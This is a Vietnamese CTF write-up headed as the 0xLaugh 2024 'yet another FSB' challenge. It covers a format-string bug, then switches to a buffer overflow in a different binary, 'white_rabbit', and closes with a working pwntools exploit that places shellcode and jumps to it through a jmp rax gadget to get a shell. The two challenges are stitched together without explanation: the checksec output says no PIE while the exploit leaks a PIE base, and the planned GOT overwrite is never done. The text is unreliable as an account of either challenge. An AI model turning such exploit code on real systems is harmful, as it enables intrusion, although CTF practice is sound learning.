# 0XLAUGH CTF 2024 - yet another FSB

Bài giải này được lấy ý tưởng từ anh `Lio`, một tiền bối trong BKISC chung team với mình hehe.

```
File:     /home/kali/CTF/0xlaugh/yet_another_fsb/public/yet_another_fsb
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
Stripped:   No
```

Ta có thể thấy rằng đây là bài Partial RELRO, và NX được bật, ngoài ra không có gì nổi bật khác. Cùng chạy thử file binary xem nó làm gì nào

```
└─$ ./yet_another_fsb
ABC
ABC



```

```
└─$ ./yet_another_fsb
%p %p %p %p %p %p %p %p
0x7ffcd2d516a0 0xff 0x7f522b22f981 (nil) 0x7f522b319f40 0x7025207025207025 0x2520702520702520 0x2070252070252070
�2+R

```

Có vẻ bài toán nhận đầu vào, sau đó khi ta nhập vào thì nó in ra lại chuỗi ta đã nhập -> Format String Bug. Cùng nhau dissamble file binary để xem đoạn code nào

```
undefined8 main(void)

{
  char input [270];
  short i;

  i = 0;
  setup();
  do {
    read(0,input,255);
    printf(input);
  } while (i != 0);
  return 0;
}


```

À há, đúng như dự định. Bài toán này có lỗ hổng Format String, kết hợp với Checksec chỉ bật `Partial Relro`, ý tưởng là như sau: Thay thế GOT của hàm `printf` thành `system` và tiến hành gọi `/bin/sh`. Hàm `printf` nhận đầu vào `input` và đưa vào thanh ghi `rdi`, từ đó ta có thể nhập chuỗi `/bin/sh` vào và chuỗi đó sẽ được đưa vào thanh ghi `rdi`. Lần sau khi gọi `printf` thì nó sẽ gọi `system('/bin/sh')`. Nhưng, có 1 vấn đề rất lớn mà chúng ta phải đối mặt, biến i được khai báo với giá trị là 0, nhưng vòng while chỉ thực hiện khi `(i != 0)`, nói cách khác. Vòng lặp này chỉ thực hiện 1 lần, cho nên việc mà ta có thể vừa `leak` địa chỉ, vừa `overwrite` GOT của hàm `printf` là không thể. Đó là lúc chúng ta cần phải nghĩ theo 1 hướng: đó là

```

void follow(void)

{
  char buffer [112];

  gets(buffer);
  return;
}

```

Và, 1 lỗ hổng khá hiển nhiên xảy ra ở hàm `follow` này. Lỗ hổng Stack Buffer Overflow, khi char buffer chỉ chứa được `112` bytes, trong khi chương trình lại sử dụng `gets` để cho ta nhập input cho
buffer, với gets, ta sẽ có thể nhập vào số bytes tuỳ thích, chỉ cần ta ghi đè được địa chỉ trả về buffer với 1 địa chỉ ta kiểm soát là xong bài toán. Địa chỉ trả về ta muốn ghi đè này sẽ chứa `shellcode` mà mình đặt. Vậy
thì khai thác thôi nào

# EXPLOITATION

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined follow()
             undefined         AL:1           <RETURN>
             undefined1[112]   Stack[-0x78]   buffer                                  XREF[1]:     00101171(*)
                             follow                                          XREF[4]:     Entry Point(*), main:0010122e(c),
                                                                                          0010205c, 001020d0(*)
        00101169 55              PUSH       RBP

```

Ta thấy rằng từ buffer ta nhập vào đến return address thì cần `0x78` bytes, ta chỉ cần đẩy vào `0x78` bytes padding là sẽ tới được địa chỉ trả về, nhưng trả về cái gì đây... Cứ thử trước đã:
Nhập vào 0x78 byte padding, breakpoint tại `ret` của hàm `follow` và xem trên `gdb.attach` xem các giá trị thanh ghi nhé:

```

Breakpoint 1, 0x0000560e5f5ce17f in follow () at warmup.c:11
warning: 11     warmup.c: No such file or directory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0x7ffd883884a0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*RBX  0x7ffd88388638 —▸ 0x7ffd88389ed7 ◂— './white_rabbit'
*RCX  0x7fd4029ff8e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
*RDX  0
*RDI  0x7fd402a01720 (_IO_stdfile_0_lock) ◂— 0
 RSI  0x7fd4029ff963 (_IO_2_1_stdin_+131) ◂— 0xa01720000000000a /* '\n' */
*R8   0
*R9   0
 R10  3
 R11  0x246
*R12  0
*R13  0x7ffd88388648 —▸ 0x7ffd88389ee6 ◂— 'POWERSHELL_TELEMETRY_OPTOUT=1'
 R14  0x7fd402a5d000 (_rtld_global) —▸ 0x7fd402a5e2e0 —▸ 0x560e5f5cd000 ◂— 0x10102464c457f
 R15  0x560e5f5d0dd8 —▸ 0x560e5f5ce110 ◂— endbr64
*RBP  0x4141414141414141 ('AAAAAAAA')
*RSP  0x7ffd88388518 —▸ 0x560e5f5ce200 (main+128) ◂— 0x8d48c68948ffffff
*RIP  0x560e5f5ce17f (follow+22) ◂— ret
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x560e5f5ce17f <follow+22>    ret                                <main+128>
    ↓







```

Cái chuỗi padding tôi nhập vào là 120 kí tự A, và nhìn xem, những kí tự đó đã vào trong thanh ghi `RAX`, vậy có nghĩa là nếu chúng ta có thể nhảy về `RAX` thì ta có thể đặt shellcode tại đó -> chương trình
thực hiện đoạn shellcode là xong. Vậy ý tưởng ban đầu là ta cần tìm 1 cái gadget liên quan đến `call rax` hoặc `jump rax`, sử dụng ROPgadget để tìm nào.

```
0x00000000000010bf : jmp rax
```

Ta đã tìm được nó, nhưng cái này chỉ là offset, đó là lý do ta cần phải có được binary base, rồi lấy `binary base + offset` thì ra địa chỉ thực tế của nó.

```

  (\_/)
  ( •_•)
  / > 0x555555555180

follow the white rabbit...

```

Nhưng trước hết ta cần lấy được địa chỉ main và lưu nó vào 1 biến đã, vì từ đó mới có binary base và leak được cái gadget kia. Tiếp theo, ta chuẩn bị shellcode thôi. Trong thư viện
`pwntools` có lệnh shellcraft.sh() để tạo nên shellcode, tôi đã dùng nó

```
shellcode = shellcraft.sh()
```

Mọi thứ đã chuẩn bị xong, giờ thì thử viết script và chạy thôii

```
from pwn import *


p = process('./white_rabbit')
e = ELF('./white_rabbit')
context.arch='amd64'
# gdb.attach(p, api=True)

shellcode = asm(shellcraft.sh())



p.recvuntil(b'> ')
main = int(p.recvn(14), 16)
base_binary = main - e.sym['main']
info("BASE BINARY: %#x", base_binary)
jump_rax = base_binary + 0x00000000000010bf

# payload = sub_rsp
payload =  shellcode
payload += b'A' * (120 - len(shellcode))
payload += p64(jump_rax)
p.recvuntil(b'follow the white rabbit...\n')
p.sendline(payload)

p.interactive()
```

Ta đặt shellcode ngay đầu `rax`, để khi nhảy lại tới `rax` thì sẽ thực thi luôn shellcode. Vậy là ta đã có được shell.

```
[*] BASE BINARY: 0x56325b5bc000
[*] Switching to interactive mode
$ cat flag.txt
ZAWARUDO$
```
